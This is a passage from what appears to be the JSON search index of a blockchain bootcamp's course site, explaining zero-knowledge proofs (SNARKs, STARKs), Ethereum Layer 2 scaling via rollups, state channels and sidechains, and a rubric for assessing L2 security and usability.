the information itself (to not give the answer to someone else). Certain tools, such as AZTEC, promise to use ZKPs to provide channels which shield the entire nature of certain transactions from the public blockchain while still using the public blockchain's security promises. Scalability: As blockchain networks grow, the amount of data they require to be maintained grows as well. ZKPs compress large amounts of data into compact, verifiable proofs, a characteristic scalability researchers hope to use to dramatically reduce the data required to maintain security on a public blockchain. From ZCash: \u201cSuccinct\u201d zero-knowledge proofs (SNARKs, STARKs) can be verified within a few milliseconds, with a proof length of only a few hundred bytes even for statements about programs that are very large. A common way Zero-Knowledge Proofs are used in blockchain is as follows. A Verifier will take the piece of data to be verified and put it through a private process (ZK-SNARK or STARK, for example) which produces a program called a Proof Circuit. This Proof Circuit can then be posted openly (such as in a Smart Contract) as it reveals no meaningful information about the nature of the data it represents. A Prover can then use the Proof Circuit to irrefutably prove they know the piece of data by publicly \"solving\" the Proof Circuit, a process that also reveals nothing about the nature of the data. The Ethereum Foundation described the impact of this privacy would have on a blockchain: Imagine, for example, an election or auction conducted on the blockchain via a smart contract such that the results can be verified by any observer of the blockchain, but the individual votes or bids are not revealed. Another possible scenario may involve selective disclosure where users would have the ability to prove they are in a certain city without disclosing their exact location. ( source ) ZKPs in Action zk-SNARKs S uccinct N on-Interactive AR gument of K nowledge, or SNARKs, were first widely implemented on a blockchain by ZCash, a fork of Bitcoin. Ethereum introduced SNARK capacity with the Byzantium fork by including precompiled contracts that allowed efficient SNARK verification on-chain. SNARKs are being discussed in terms of privacy (as in ZCash) and scalability (as in SNARK roll-ups ) Pros: Small, constant proof size Constant-time verification costs ( source ) Cons: Trusted setup required (see ZCash parameter generation ceremony ) Relies on Elliptic Curve Cryptography, which is not quantum-resistant zk-STARKs S calable and T ransparent AR gument of K nowledge, or STARKs, share a similar fundamental ideas with SNARKs but differ in execution. Their development and advocacy is done chiefly by STARKware, a private company led by Eli Ben Sasson, with assistance from the Ethereum Foundation. Pros: No trusted setup required Faster proving time relative to SNARKs ( source ) Cons: STARKs have a larger proof size than SNARKs As of June 2019, STARKs still in development ZKP Tutorials \"Hello World\" of zk-SNARKS with Zokrates Creating a zk-SNARKS version of \"Mastermind\" in the Browser \u2014 Koh Wei Jie GitHub Repo for Creating a zk-SNARKS version of \"Mastermind\" in the Browser Developing Confidential Tokens on AZTEC(requires access to Rinkeby Testnet) Docs: Cairo \u2014 a Turing-complete STARK generation Cairo, Starkware's ZKP language, has a great doc repository here, including a great introductory tutorial. Reddit Scaling Bake-Off ZKP Submissions: STARKWare , Fuel Labs , AZTEC More Resources Article: NYTimes 1987 article discussing the discovery of ZK Proofs Article: Why and How zk-SNARK Works Article: Introduction to zk-SNARKS with Examples Wiki: Zero Knowledge Starter Pack (S[NT]ARK focused) Wiki: Zero Knowledge Proof Science Resources Article: Not-so-gentle Introduction to the PCP Theorem (PCP Theorem underpins many ZKPs) Series: The Math behind STARKs (abstract but still technical) Article: An Approximate Introduction to how zk-SNARKs are possible Video: Vitalik Buterin: Scalable Blockchains as Data Layers","title":"Zero-Knowledge Proofs"},{"location":"S07-additional-topics/L4-zkp/#zero-knowledge-proofs","text":"In our section on scalability later in the course, we will discuss Zero-Knowledge Proof rollups, but we won't go into detail about what ZKPs are. In this section, we'll discuss the basics of ZKPs and compare two common implementations of ZKPs you'll see in blockchain. Zero-Knowledge Proofs have been researched since the 1980s\u2014the initial researchers of ZKPs received the Turing Award, the highest award in computer science, for their work. Their development stems from the field of computational complexity and, while most of the work of ZKPs is very technical, we'll try to provide a broad overview. The goal of zero-knowledge proofs (ZKPs) is for a verifier to be able to convince themselves that a prover possesses knowledge of a secret parameter, called a witness , satisfying some relation, without revealing the witness to the verifier or anyone else. Zero-knowledge proofs are currently being researched as solutions to two main issues in public blockchains: Privacy: All essential information within a blockchain network must be public. ZKPs allow users to verify / prove certain elements of information (such as the answer to a crossword puzzle) while not revealing the information itself (to not give the answer to someone else). Certain tools, such as AZTEC, promise to use ZKPs to provide channels which shield the entire nature of certain transactions from the public blockchain while still using the public blockchain's security promises. Scalability: As blockchain networks grow, the amount of data they require to be maintained grows as well. ZKPs compress large amounts of data into compact, verifiable proofs, a characteristic scalability researchers hope to use to dramatically reduce the data required to maintain security on a public blockchain. From ZCash: \u201cSuccinct\u201d zero-knowledge proofs (SNARKs, STARKs) can be verified within a few milliseconds, with a proof length of only a few hundred bytes even for statements about programs that are very large. A common way Zero-Knowledge Proofs are used in blockchain is as follows. A Verifier will take the piece of data to be verified and put it through a private process (ZK-SNARK or STARK, for example) which produces a program called a Proof Circuit. This Proof Circuit can then be posted openly (such as in a Smart Contract) as it reveals no meaningful information about the nature of the data it represents. A Prover can then use the Proof Circuit to irrefutably prove they know the piece of data by publicly \"solving\" the Proof Circuit, a process that also reveals nothing about the nature of the data. The Ethereum Foundation described the impact of this privacy would have on a blockchain: Imagine, for example, an election or auction conducted on the blockchain via a smart contract such that the results can be verified by any observer of the blockchain, but the individual votes or bids are not revealed. Another possible scenario may involve selective disclosure where users would have the ability to prove they are in a certain city without disclosing their exact location. ( source )","title":"Zero-Knowledge Proofs"},{"location":"S07-additional-topics/L4-zkp/#zkps-in-action","text":"","title":"ZKPs in Action"},{"location":"S07-additional-topics/L4-zkp/#zk-snarks","text":"S uccinct N on-Interactive AR gument of K nowledge, or SNARKs, were first widely implemented on a blockchain by ZCash, a fork of Bitcoin. Ethereum introduced SNARK capacity with the Byzantium fork by including precompiled contracts that allowed efficient SNARK verification on-chain. SNARKs are being discussed in terms of privacy (as in ZCash) and scalability (as in SNARK roll-ups ) Pros: Small, constant proof size Constant-time verification costs ( source ) Cons: Trusted setup required (see ZCash parameter generation ceremony ) Relies on Elliptic Curve Cryptography, which is not quantum-resistant","title":"zk-SNARKs"},{"location":"S07-additional-topics/L4-zkp/#zk-starks","text":"S calable and T ransparent AR gument of K nowledge, or STARKs, share a similar fundamental ideas with SNARKs but differ in execution. Their development and advocacy is done chiefly by STARKware, a private company led by Eli Ben Sasson, with assistance from the Ethereum Foundation. Pros: No trusted setup required Faster proving time relative to SNARKs ( source ) Cons: STARKs have a larger proof size than SNARKs As of June 2019, STARKs still in development","title":"zk-STARKs"},{"location":"S07-additional-topics/L4-zkp/#zkp-tutorials","text":"\"Hello World\" of zk-SNARKS with Zokrates Creating a zk-SNARKS version of \"Mastermind\" in the Browser \u2014 Koh Wei Jie GitHub Repo for Creating a zk-SNARKS version of \"Mastermind\" in the Browser Developing Confidential Tokens on AZTEC(requires access to Rinkeby Testnet) Docs: Cairo \u2014 a Turing-complete STARK generation Cairo, Starkware's ZKP language, has a great doc repository here, including a great introductory tutorial. Reddit Scaling Bake-Off ZKP Submissions: STARKWare , Fuel Labs , AZTEC","title":"ZKP Tutorials"},{"location":"S07-additional-topics/L4-zkp/#more-resources","text":"Article: NYTimes 1987 article discussing the discovery of ZK Proofs Article: Why and How zk-SNARK Works Article: Introduction to zk-SNARKS with Examples Wiki: Zero Knowledge Starter Pack (S[NT]ARK focused) Wiki: Zero Knowledge Proof Science Resources Article: Not-so-gentle Introduction to the PCP Theorem (PCP Theorem underpins many ZKPs) Series: The Math behind STARKs (abstract but still technical) Article: An Approximate Introduction to how zk-SNARKs are possible Video: Vitalik Buterin: Scalable Blockchains as Data Layers","title":"More Resources"},{"location":"S08-scalability/M1-intro/L1-overview/","text":"Intro to Scalability Ethereum gas fees have risen astronomically as the network becomes more popular. The ability of retail investors to participate in new Ethereum-based offerings like DeFi is circumscribed by the ever-increasing cost of entry into the space. Three main challenges presented by the success of mainnet Ethereum: 1. Spiking gas costs price-out market share and impact user experience. Best case is loss of low-value transactions and poor UX due to stuck transactions. Worst case is compromising healthy market operation like Black Thursday. 2. Block Latency is problematic in some applications 3. Pushing gas costs to users creates friction and impacts user experience. User has to navigate rather complex effects. As a result, some users and products are migrating to other chains that offer lower costs. Off-chain scaling is capable of solving these problems by providing higher throughput, faster state advancement and gas cost abstraction. It can be transformative for application UX State advancement (propagating new network state) is 10-100x faster (the rate at which data can be updated on-chain). Reducing user feedback loop from 12s to <1s. High frequency transactions possible (e.g. high-fidelity price oracles, rapid orderbook management) Transactions are a fraction of the cost. Low or no-value transactions viable Support for native gas cost abstraction, meta-transactions, account abstraction. Subsidised gas, or gas cost is paid in relevant tokens. Better native support for smart contract wallets and features like social recovery. If Ethereum is to maintain its dominance and network effect, it must scale. Terminology In the following sections, we're first going to go through some of the types of Layer 2 solutions. Then walk through examples of popular Layer 2 solutions. We're then going to talk about crosschain and blockchain interoperability. Finally, we're going to have live sessions and presentations based around L2 platforms such as Polygon, Optimism and more. In this section, we'll typically refer to mainnet Ethereum as Layer 1 or L1 and whatever the scaling solution is as a Layer 2 solution (L2), a sidechain, sidechannel or a bridge. Conclusion These are exciting and very new topics, please be aware that they are considered very cutting edge and you should be extremely careful when using them. Also, please know that the documentation changes very regularly and perhaps not perceptibly. If you're currently building on a Layer 2 solution, we recommend joining the project's Discord, or wherever the community gathers, and making sure to follow their developer updates. Let's dive in!","title":"Intro to Scalability"},{"location":"S08-scalability/M1-intro/L1-overview/#intro-to-scalability","text":"Ethereum gas fees have risen astronomically as the network becomes more popular. The ability of retail investors to participate in new Ethereum-based offerings like DeFi is circumscribed by the ever-increasing cost of entry into the space. Three main challenges presented by the success of mainnet Ethereum: 1. Spiking gas costs price-out market share and impact user experience. Best case is loss of low-value transactions and poor UX due to stuck transactions. Worst case is compromising healthy market operation like Black Thursday. 2. Block Latency is problematic in some applications 3. Pushing gas costs to users creates friction and impacts user experience. User has to navigate rather complex effects. As a result, some users and products are migrating to other chains that offer lower costs. Off-chain scaling is capable of solving these problems by providing higher throughput, faster state advancement and gas cost abstraction. It can be transformative for application UX State advancement (propagating new network state) is 10-100x faster (the rate at which data can be updated on-chain). Reducing user feedback loop from 12s to <1s. High frequency transactions possible (e.g. high-fidelity price oracles, rapid orderbook management) Transactions are a fraction of the cost. Low or no-value transactions viable Support for native gas cost abstraction, meta-transactions, account abstraction. Subsidised gas, or gas cost is paid in relevant tokens. Better native support for smart contract wallets and features like social recovery. If Ethereum is to maintain its dominance and network effect, it must scale.","title":"Intro to Scalability"},{"location":"S08-scalability/M1-intro/L1-overview/#terminology","text":"In the following sections, we're first going to go through some of the types of Layer 2 solutions. Then walk through examples of popular Layer 2 solutions. We're then going to talk about crosschain and blockchain interoperability. Finally, we're going to have live sessions and presentations based around L2 platforms such as Polygon, Optimism and more. In this section, we'll typically refer to mainnet Ethereum as Layer 1 or L1 and whatever the scaling solution is as a Layer 2 solution (L2), a sidechain, sidechannel or a bridge.","title":"Terminology"},{"location":"S08-scalability/M1-intro/L1-overview/#conclusion","text":"These are exciting and very new topics, please be aware that they are considered very cutting edge and you should be extremely careful when using them. Also, please know that the documentation changes very regularly and perhaps not perceptibly. If you're currently building on a Layer 2 solution, we recommend joining the project's Discord, or wherever the community gathers, and making sure to follow their developer updates. Let's dive in!","title":"Conclusion"},{"location":"S08-scalability/M2-types/L1/","text":"Types of Scaling Solutions Several options have been proposed and worked on for scaling Ethereum on a shorter time frame. Some of these efforts are coming to fruition now and are worth considering. The main tradeoffs for choosing a scaling solution involve considerations of throughput vs. security vs. usability . The following are some solutions currently in the works at various stages: Note: This section draws heavily on the work on Faina Shalts, engineer at Truffle (and Bootcamp alumni!) as well as from Ethereum.org Rollups In general, on Rollup Layer 2 solutions, transactions are submitted to L2 nodes instead of L1, and batched. Eventually they are put on L1 and no longer mutable. L2 nodes are Ethereum compatible, independent blockchains. All state and execution is handled in L2: Signature verification, Contract execution, etc. The L1 only stores transaction data Note: the terminology here can be challenging but Pranay Mohan of Celo Network proposes we think of rollups as shard clients and the rollup contracts as on-chain light clients. There are two major kinds of Rollups: ZK-Rollups and Optimistic Rollups. Zero-Knowledge / ZK-Rollups As we mentioned earlier in the section on Zero-Knowledge proofs, ZKPs can compress a larger amount of computation or verification into a single operation. ZK-Rollups bundle hundreds of transfers that occur on the ZKP Rollup L2 into a single L1, mainnet transaction via a smart contract located on L1. From the data submitted the smart contract can verify all the transfers that are included. Critically, you don\u2019t need all the data to verify the transactions, just the zero-knowledge proof. Transactions are written to Ethereum as calldata, to reduce gas. Pros No delay, less vulnerable to economic attacks Cons Limited to simple transfers and ZK-Rollup chains not compatible with EVM as validity proofs are intense to compute and have to build their own language to process. However, there is some work on building Solidity to ZKP language compilers, like this one for Cairo, Starknet's ZKP language. ZK-Rollups are not worth it for applications with little on-chain activity but are attractive for simple, high-volume exchanges. Currently using this sort of rollup: Loopring , Starkware, Matter Labs' zkSync, Aztec's ZK.Money network Optimistic Rollups Optimistic Rollups use a sidechain that sits in parallel to the mainnet Ethereum chain. They don\u2019t do any computation by default: after a transaction, the Optimistic Rollup L2s proposes a new state to the L1 mainnet, or \u201cnotarizes\u201d the transaction. L2 Transactions written to L1 mainnet as calldata . The main mechanism that makes this work are fraud proofs: If a verifier notices a fraudulent transaction the Optimistic Rollup network will execute a fraud-proof and run the transaction\u2019s computation using the available state data; the gas you need to run a fraud proof is reimbursed. Pros Anything you can do on L1 you can do with Optimistic Rollups because it is EVM and Solidity compatible. All transaction data is stored on the L1 chain, meaning it remains secure and decentralized. Cons Long wait times for on-chain transactions due to potential fraud challenges. Potentially vulnerable to attacks if the value in an optimistic rollup exceeds the amount in an operator\u2019s bond. Optimistic Roll-ups are currently being built by Optimistic PBC, Arbitrum, Fuel Network, ImmutableX, Deversifi and Cartesi Channels Channels, also called Side Channels or State Channels, allow participants to transact a certain number of times off-chain (on the channel) while only submitting 2 transactions to the network on chain (basically, the start and stop of the channel). Fundamentally for a channel to exist, participants must lock a portion of Ethereum\u2019s state, like an ETH deposit, in a multisig contract. Locking state in this way opens up the channel, allowing for the off-chain transactions to occur. When the interaction is finished, one final L1 transaction is submitted, updating the network state based on the activity that occurred on the channel (mainly the rebalancing of funds between the participants). Sidenote: State channels on Ethereum can be enforced through a concept known as counterfactual instantiation. Here's a technical, but concise, overview of counterfactual instantiation: Counterfactual instantiation is achieved by making users sign and share commitments to the multisig wallet. These commitments say that if the counterfactually instantiated contract were to be instantiated on-chain, the multisig wallet (which holds the state deposit) will look at the instantiated contract and transfer the appropriate state deposits based on the state of that contract. On Ethereum, you can use the CREATE2 opcode to predetermine the address of a contract. This means you can make these commitments in a channel and, if you need to dispute something, either party can deploy that contract with the chain of valid commitments. State Channel pros and cons (from Ethereum.org ): - Pros Instant withdrawal/settling on mainnet, high throughput, lower cost per transaction - Cons Time and cost to set up and settle a channel. Funds must be locked up, participants need to periodically watch the network. Channels don\u2019t support open participation. Examples of state channels are Connext, Raiden Network, and Bitcoin's Lightning Network. Sidechains The terminology here can get a little tricky, so bear with us. Sidechains are essentially blockchain networks separate from your Layer 1 (for us, Ethereum). They are connected through a bridge, which allows state to be conveyed from one chain to the other. We'll discuss this more in the crosschain and interoperability section, but essentially you'd use a chain that either has a consensus mechanism with a higher trust assumption (such as Proof of Authority) or some increased transaction throughput relative to your Layer 1. You would then be able to conduct transactions on that sidechain and, when you need to update the state (perhaps a user wishes to exit your network but wants to take their tokens), you can release it on your Layer 1. Examples of sidechains are SKALE and xDai. Conclusion This concludes our overview of the kinds of scaling solutions available to us. It is by no means comprehensive, since the field is rapidly evolving. In the next section, we'll provide a basic rubric by which you can judge any Layer 2 or general scaling solution. Additional Material Wiki: Scaling (Ethereum.org) Great overview of the topic, including the \"pros and cons\" of different solutions Video: Layer 2 Scaling Explained (Finematics) Dashboard: L2beat A research and network dashboard showing the current level of activity on different networks. Article: Off-chain protocols: Sidechains and Rollups (Infura) Slide Deck: Scaling Ethereum using Rollups and Sidechains From the Engineering Ethereum meetup and presented by Peter Robinson. Article: Maker's roadmap for L2s Discusses one major application's understanding and strategy for Layer 2 solutions. Article: A Note on Bridges & Layer 2 Protocols (Patrick McCorry) A discussion around different sorts of bridge technologies and considerations we should have when using them. Video: How Layer 2 Addresses Barriers for Enterprise Building on Mainnet Rollups Article: An Incomplete Guide to Rollups (Vitalik Buterin) A follow-up article to Buterin's post on eth.research entitled, \"What would a rollup-centric ethereum roadmap look like?\" and here's a video version of the article. Research: Compressing Data Using Rollups A technical discussions around optimizing data compression for Rollups Thread: Rollup verification A great walkthrough about how rollups conduct verification and how that verification can make it to Layer 1 Article: (Almost) Everything You Need to Know About Optimistic Rollup (Paradigm) Really good technical overview of optimistic rollup tech Artilce: Arbitrum in under 10 minutes An explainer of Arbitrum, an optimistic rollup. Video: Scaling Ethereum with Rollups John Adler from Fuel Labs discusses the concepts behind optimistic rollups Article: Warp Your Way to Starknet Early example of a Solidity to Cairo compiler State Channels Article: State Channel Basics Article: Generalized State Channels on Ethereum Goes into more detail about counterfactual instantiation. Article: State Channels Basic overview of the technology from 2015. Good evergreen concepts here. Article Series: A State Channels Adventure A potentially NSFW walkthrough of the physics behind counterfactual instantiation. Tutorial: Precompute Contract Addresses with CREATE2 A great code tutorial from Solidity by Example showing how to find a predetermined address for a contract, the backbone of counterfactual instantiation. Code Demo: Web3 Torrent A Proof of Concept from StateChannels.org, a torrenting network built using state channels (or a subset of state channels they call virtual channels ).","title":"Types of Scaling Solutions"},{"location":"S08-scalability/M2-types/L1/#types-of-scaling-solutions","text":"Several options have been proposed and worked on for scaling Ethereum on a shorter time frame. Some of these efforts are coming to fruition now and are worth considering. The main tradeoffs for choosing a scaling solution involve considerations of throughput vs. security vs. usability . The following are some solutions currently in the works at various stages: Note: This section draws heavily on the work on Faina Shalts, engineer at Truffle (and Bootcamp alumni!) as well as from Ethereum.org","title":"Types of Scaling Solutions"},{"location":"S08-scalability/M2-types/L1/#rollups","text":"In general, on Rollup Layer 2 solutions, transactions are submitted to L2 nodes instead of L1, and batched. Eventually they are put on L1 and no longer mutable. L2 nodes are Ethereum compatible, independent blockchains. All state and execution is handled in L2: Signature verification, Contract execution, etc. The L1 only stores transaction data Note: the terminology here can be challenging but Pranay Mohan of Celo Network proposes we think of rollups as shard clients and the rollup contracts as on-chain light clients. There are two major kinds of Rollups: ZK-Rollups and Optimistic Rollups.","title":"Rollups"},{"location":"S08-scalability/M2-types/L1/#zero-knowledge-zk-rollups","text":"As we mentioned earlier in the section on Zero-Knowledge proofs, ZKPs can compress a larger amount of computation or verification into a single operation. ZK-Rollups bundle hundreds of transfers that occur on the ZKP Rollup L2 into a single L1, mainnet transaction via a smart contract located on L1. From the data submitted the smart contract can verify all the transfers that are included. Critically, you don\u2019t need all the data to verify the transactions, just the zero-knowledge proof. Transactions are written to Ethereum as calldata, to reduce gas. Pros No delay, less vulnerable to economic attacks Cons Limited to simple transfers and ZK-Rollup chains not compatible with EVM as validity proofs are intense to compute and have to build their own language to process. However, there is some work on building Solidity to ZKP language compilers, like this one for Cairo, Starknet's ZKP language. ZK-Rollups are not worth it for applications with little on-chain activity but are attractive for simple, high-volume exchanges. Currently using this sort of rollup: Loopring , Starkware, Matter Labs' zkSync, Aztec's ZK.Money network","title":"Zero-Knowledge / ZK-Rollups"},{"location":"S08-scalability/M2-types/L1/#optimistic-rollups","text":"Optimistic Rollups use a sidechain that sits in parallel to the mainnet Ethereum chain. They don\u2019t do any computation by default: after a transaction, the Optimistic Rollup L2s proposes a new state to the L1 mainnet, or \u201cnotarizes\u201d the transaction. L2 Transactions written to L1 mainnet as calldata . The main mechanism that makes this work are fraud proofs: If a verifier notices a fraudulent transaction the Optimistic Rollup network will execute a fraud-proof and run the transaction\u2019s computation using the available state data; the gas you need to run a fraud proof is reimbursed. Pros Anything you can do on L1 you can do with Optimistic Rollups because it is EVM and Solidity compatible. All transaction data is stored on the L1 chain, meaning it remains secure and decentralized. Cons Long wait times for on-chain transactions due to potential fraud challenges. Potentially vulnerable to attacks if the value in an optimistic rollup exceeds the amount in an operator\u2019s bond. Optimistic Roll-ups are currently being built by Optimistic PBC, Arbitrum, Fuel Network, ImmutableX, Deversifi and Cartesi","title":"Optimistic Rollups"},{"location":"S08-scalability/M2-types/L1/#channels","text":"Channels, also called Side Channels or State Channels, allow participants to transact a certain number of times off-chain (on the channel) while only submitting 2 transactions to the network on chain (basically, the start and stop of the channel). Fundamentally for a channel to exist, participants must lock a portion of Ethereum\u2019s state, like an ETH deposit, in a multisig contract. Locking state in this way opens up the channel, allowing for the off-chain transactions to occur. When the interaction is finished, one final L1 transaction is submitted, updating the network state based on the activity that occurred on the channel (mainly the rebalancing of funds between the participants). Sidenote: State channels on Ethereum can be enforced through a concept known as counterfactual instantiation. Here's a technical, but concise, overview of counterfactual instantiation: Counterfactual instantiation is achieved by making users sign and share commitments to the multisig wallet. These commitments say that if the counterfactually instantiated contract were to be instantiated on-chain, the multisig wallet (which holds the state deposit) will look at the instantiated contract and transfer the appropriate state deposits based on the state of that contract. On Ethereum, you can use the CREATE2 opcode to predetermine the address of a contract. This means you can make these commitments in a channel and, if you need to dispute something, either party can deploy that contract with the chain of valid commitments. State Channel pros and cons (from Ethereum.org ): - Pros Instant withdrawal/settling on mainnet, high throughput, lower cost per transaction - Cons Time and cost to set up and settle a channel. Funds must be locked up, participants need to periodically watch the network. Channels don\u2019t support open participation. Examples of state channels are Connext, Raiden Network, and Bitcoin's Lightning Network.","title":"Channels"},{"location":"S08-scalability/M2-types/L1/#sidechains","text":"The terminology here can get a little tricky, so bear with us. Sidechains are essentially blockchain networks separate from your Layer 1 (for us, Ethereum). They are connected through a bridge, which allows state to be conveyed from one chain to the other. We'll discuss this more in the crosschain and interoperability section, but essentially you'd use a chain that either has a consensus mechanism with a higher trust assumption (such as Proof of Authority) or some increased transaction throughput relative to your Layer 1. You would then be able to conduct transactions on that sidechain and, when you need to update the state (perhaps a user wishes to exit your network but wants to take their tokens), you can release it on your Layer 1. Examples of sidechains are SKALE and xDai.","title":"Sidechains"},{"location":"S08-scalability/M2-types/L1/#conclusion","text":"This concludes our overview of the kinds of scaling solutions available to us. It is by no means comprehensive, since the field is rapidly evolving. In the next section, we'll provide a basic rubric by which you can judge any Layer 2 or general scaling solution.","title":"Conclusion"},{"location":"S08-scalability/M2-types/L1/#additional-material","text":"Wiki: Scaling (Ethereum.org) Great overview of the topic, including the \"pros and cons\" of different solutions Video: Layer 2 Scaling Explained (Finematics) Dashboard: L2beat A research and network dashboard showing the current level of activity on different networks. Article: Off-chain protocols: Sidechains and Rollups (Infura) Slide Deck: Scaling Ethereum using Rollups and Sidechains From the Engineering Ethereum meetup and presented by Peter Robinson. Article: Maker's roadmap for L2s Discusses one major application's understanding and strategy for Layer 2 solutions. Article: A Note on Bridges & Layer 2 Protocols (Patrick McCorry) A discussion around different sorts of bridge technologies and considerations we should have when using them. Video: How Layer 2 Addresses Barriers for Enterprise Building on Mainnet","title":"Additional Material"},{"location":"S08-scalability/M2-types/L1/#rollups_1","text":"Article: An Incomplete Guide to Rollups (Vitalik Buterin) A follow-up article to Buterin's post on eth.research entitled, \"What would a rollup-centric ethereum roadmap look like?\" and here's a video version of the article. Research: Compressing Data Using Rollups A technical discussions around optimizing data compression for Rollups Thread: Rollup verification A great walkthrough about how rollups conduct verification and how that verification can make it to Layer 1 Article: (Almost) Everything You Need to Know About Optimistic Rollup (Paradigm) Really good technical overview of optimistic rollup tech Artilce: Arbitrum in under 10 minutes An explainer of Arbitrum, an optimistic rollup. Video: Scaling Ethereum with Rollups John Adler from Fuel Labs discusses the concepts behind optimistic rollups Article: Warp Your Way to Starknet Early example of a Solidity to Cairo compiler","title":"Rollups"},{"location":"S08-scalability/M2-types/L1/#state-channels","text":"Article: State Channel Basics Article: Generalized State Channels on Ethereum Goes into more detail about counterfactual instantiation. Article: State Channels Basic overview of the technology from 2015. Good evergreen concepts here. Article Series: A State Channels Adventure A potentially NSFW walkthrough of the physics behind counterfactual instantiation. Tutorial: Precompute Contract Addresses with CREATE2 A great code tutorial from Solidity by Example showing how to find a predetermined address for a contract, the backbone of counterfactual instantiation. Code Demo: Web3 Torrent A Proof of Concept from StateChannels.org, a torrenting network built using state channels (or a subset of state channels they call virtual channels ).","title":"State Channels"},{"location":"S08-scalability/M3-rubric/L1/","text":"Rubric for Analyzing Scalability Solutions The challenge with understanding Layer 2 and scaling solutions is a common challenge for The explosion in demand for sophisticated, bleeding-edge cryptographic products leads to a common predicament in blockchain. For those not deeply familiar with these projects and their associated tech, it\u2019s extremely difficult\u2014if not intimidating\u2014to decide which is best and safest to use. Not to mention the rate of change of L2 documentation and the L2 frameworks themselves. However, there are trade-offs to using scalability solutions. Trade-offs to the blockchain primitives we discussed earlier in the course. With this section, we will continue propose a framework to assist the analysis of L2 projects. It\u2019s meant to help the reader develop an intuition for approaching a possible L2 solution for their various needs and circumstances. But it's also meant to highlight the trade-offs a scalability approach requires against our main blockchain network layer. This framework has eight assessment variables ( Operator , Data Availability , Computational Integrity , Economic Security , Stack Security , Capital Efficiency , Transaction Finality , and Programmability ). We use these assessment variables to score a project in three areas: Throughput , Security and Usability . See how the variables contribute to each area below: To be clear, these variables are not exhaustive. We haven\u2019t included network costs, users costs or the downstream network effects a Layer 2 inherits from the underlying Layer 1 blockchain. Again, the idea of the framework is not necessarily to be comprehensive but rather help develop an intuition for the benefits and trade-offs of different L2 solutions. Be sure to keep in mind the mental model around distributed consensus we learned earlier, it will come in handy. You can understand this lesson as a deeper development of the roles and features we discussed there. L2 Operator An Operator describes an actor within the L2 system responsible for executing state change within the L2 network. This includes facilitating entrances and exits to the L2 system as well as processing and authorizing transactions within the L2 system. Some considerations when analyzing an operator: - Is an Operator required in the L2 network? - Understanding Their Role: Who or what is the operator? What is the Operator responsible for? What is the motivation to become an Operator? - Trust Assumptions: Who can become an Operator? What power does an Operator have? What consensus rules do they abide by? What trust assumptions must users make about the Operator? - Risk Exposure: After answering the above questions, what risks do we need to consider? For example, how does the network respond when an Operator disappears, misbehaves. How does the system respond to L1 attacks or mass exit? Computational Integrity Computational Integrity (CI) is a key property of network security. CI seeks to ensure that the code for a given computation runs exactly as intended and therefore the state transition outputs are correct. Let\u2019s unpack this. The operation of each state advancement in a network can be simplified to: CI ensures that the data in the network is correct, because the code that advances the state of the network has run correctly and without manipulation by the operator actually performing the computation. It is enforced through two primary methods: Crypto-Economic Incentives This could take the form of incentivised consensus where the network can only advance if all network participants run and post the same computation resulting in a critical mass of agreement. It could also take the form of incentivised watchtowers where the network trusts third-parties to verify CI from operators and, in the case of misbehavior, trigger a network failsafe. Zero-Knowledge Cryptography Building mathematical assurances into the network\u2019s code execution model making integrity provable and verifiable Data Availability This refers to the availability and immutability of intermediary state transition data. To go back to our state advancement of the network diagram: State transition data is a list of all intermediary state changes, alongside proof they are valid (e.g. aggregate signatures, ZKPs). Once a user\u2019s assets enter a L2, they are subject to the security properties of the L2, and therefore data availability is key to being able to verify that what happens to the user\u2019s assets within the L2 is valid and correct. Economic Security Economic Security refers to the operational security that upholds the financial integrity of the L2 system. It can be rooted in two different areas: Inherited Economic Security from L1 This can be a strong inheritance where L2 assets are ultimately secured in contracts on L1 and L2 state transitions are checkpointed on L1. It can also be a weak inheritance, where L2 assets are ultimately secured on L1, but computational integrity and data availability are not secured by L1 Security Inherent to the Operator The characteristics of the L2 Operators may lend additional security, for example in Proof of Stake. Keep in mind, consensus methods such as Proof of Authority lend no inherent security beyond basic trust in the Operators. Stack Security Stack Security is more of a passive security that comes from having a battle-hardened software stack. It includes aspects like: Shared Cryptographic Primitives Or primitives developed and hardened over decades of research and application. Compare this with newer cryptographic features that may not currently enjoy widespread adoption. For example, Elliptic Curve Cryptography versus newer ZKP methods. Shared Technology Stack Shared Investments into core technology stack and open-source network effects. Examples include the Go-Ethereum implementation, Solidity compiler and EVM runtime maintained by hundreds of contributors over time. Shared Ancillary Tooling Mature development environments and workflows, such as Truffle as well as security tooling, such as EVM bytecode formal verification, Solidity static analysis and fuzzers. Shared ecosystem and aligned security objectives The powerful network effects delivered by open-source development and the community that forms around it. Includes security gathered from audits, formal verification development, and institutional knowledge of attack vectors and history. Capital Efficiency This refers to the cost and utility of capital held in an L2 network over time. L2 capital efficiency points that should be considered include: Capital must be locked into an L1 contract in order to move into the L2 Locking capital can come at high opportunity cost depending on the lockup times. Some systems require a lockup time of minutes, others require weeks. The real cost of capital can be discounted depending on the utility available within the network If the user can access great utility, the opportunity costs of lockup can be lower even if their capital is locked up. Fees for rapid exits, facilitated by liquidity providers (LPs), will be determined by real cost of capital. We'll discuss this more in our live session, \"Problems Still to Be Solved in Scalability.\" Transaction Finality Transaction finality on L1s is essentially full redeemability of assets. For L2s, there are multiple phases of finality: Operator finality, Checkpoint finality and L1 finality. The relationship of these three within a generic L2 is shown below: A user submitting a transaction within an L2 gets near-instantaneous finality when their transaction has been processed by an Operator. The user does not necessarily have to wait for L1 redeemability, rather they can use the Operator Finality as proof to exit via a Liquidity Provider. The Operator periodically submits a batch of L2 transactions and the subsequent state changes to L1. These submissions represent Checkpoint finality. The assets are not redeemable on L1 yet, but the data proving ownership of those assets are now on L1. This should give the user a much higher confidence in their assets\u2019 eventual redemption. At some point, the computational integrity of all those submitted L2 state transitions is verified on L1. Once that occurs, we have L1 finality and the user\u2019s assets are redeemable on L1. Programmability Programmability at the L2 layer is important. Programmability is the key feature of Ethereum. Transactions become a canvas for innovation compared to the more limited execution environment like Bitcoin\u2019s Script. L2 projects that reuse the Ethereum stack benefit from the collective investment into security, developer tools, community support and knowledge of stack, languages, gotchas and failure modes. Zero-knowledge proof (ZKP)-powered L2s are forcing innovation in the programmability arena. ZKP execution environments have traditionally been limited in their capacity due to the nature of their circuits. New zk-circuit-friendly languages are emerging (Gnark, Cairo, Zinc) and bringing greater programmability; however, they require new virtual machines with little proven track record and nascent community support. Extending programmability at the L2 layer will provide an opportunity to experiment with low-level innovation and EIP protocol-level changes like account abstraction, native meta-transaction, and different computation models or runtimes. Conclusion This was a very technical discussion of the rubric for analyzing L2 or scalability solutions. We hope it gives you a sense of the trade-offs each solution provides. If you'd like a 